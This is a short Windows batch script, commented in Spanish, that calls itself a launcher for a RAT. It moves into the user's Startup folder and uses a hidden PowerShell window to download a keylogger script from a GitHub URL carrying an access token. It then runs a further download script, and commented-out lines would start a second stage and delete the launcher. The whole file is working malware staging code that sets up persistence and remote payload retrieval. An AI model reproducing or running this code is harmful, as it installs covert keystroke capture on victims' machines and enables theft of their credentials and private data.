@echo off
@REM Launcher para el RAT

@REM Variables
@REM Locación inicial
set "INITIALPATH=%cd%"
@REM definr directorio inicio de programas.
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM Dirigirse al direcrotio del inicio de windows.
cd  %STARTUP% 

@REM Ejecutar payloads al inicio.
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/Recursos/Keylogger/p.ps1?token=GHSAT0AAAAAABY5KKPPTQJINMCGXR4UI37CYZHOMXA -OutFile p.ps1"

@REM corriendo el payload
@REM powershell Start-Process CMD.exe -windowstyle hidden "%STARTUP%/stage2.cmd"
powershell ./wget.cmd

@REM cd hacia la locacion inicial
cd %INITIALPATH%

@REM Borramos el iniciador
@REM DEL "initial.cmd"